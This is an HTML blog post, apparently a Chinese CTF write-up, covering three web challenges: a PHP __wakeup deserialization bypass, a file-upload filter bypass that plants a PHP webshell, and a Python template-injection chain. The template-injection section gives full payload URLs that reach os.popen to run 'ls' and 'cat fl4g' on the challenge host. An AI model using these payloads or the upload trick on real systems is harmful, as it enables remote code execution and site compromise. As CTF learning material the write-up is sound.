@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    0507/unserialize3&amp;upload1&amp;Web_python_template_injection |
+    
+    MrzBlog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-0507/unserialize3&amp;upload1&amp;Web_python_template_injection" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      0507/unserialize3&amp;upload1&amp;Web_python_template_injection
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/05/25/0507/unserialize3&upload1&Web_python_template_injection/" class="article-date">
+  <time datetime="2020-05-25T15:07:14.644Z" itemprop="datePublished">2020-05-25</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>wakeup函数在反序列化之前调用。</p>
+<p>如果序列化后声明的的属性个数大于实际的属性个数，就可绕过wakeup函数。</p>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>审计源码发现只支持jpg或png后缀</p>
+<p>编辑一句话代码，虚晃一枪将后缀改为jpg</p>
+<p>上传时抓包，更改回php后缀，木马植入成功。</p>
+<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>题目提示python模板注入</p>
+<p>1.首先尝试url/49回显49 说明存在注入</p>
+<p>2.接着找到os</p>
+<p>2.1找到str类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.2找到str类的父类object</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.3找object类中的引用列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.4找到处于下标71的os的所在类site._Painter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2].__subclasses__()[71]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.5找到os</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.6执行命令为所欲为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.7得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.126.19.106:30931&#x2F;&#123;&#123;&#39; &#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://rookiez996.github.io/2020/05/25/0507/unserialize3&upload1&Web_python_template_injection/" data-id="ckammmwam0008g8ui6ou800sr"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/05/25/0508/Web_php_unserialize&supersqli&easy_tornado/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            0508/Web_php_unserialize&amp;supersqli&amp;easy_tornado
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/25/0506/Web_php_include&NewsCenter&NaNNaNNaNNaN-Batman&PHP2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">0506/Web_php_include&amp;NewsCenter&amp;NaNNaNNaNNaN-Batman&amp;PHP2</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
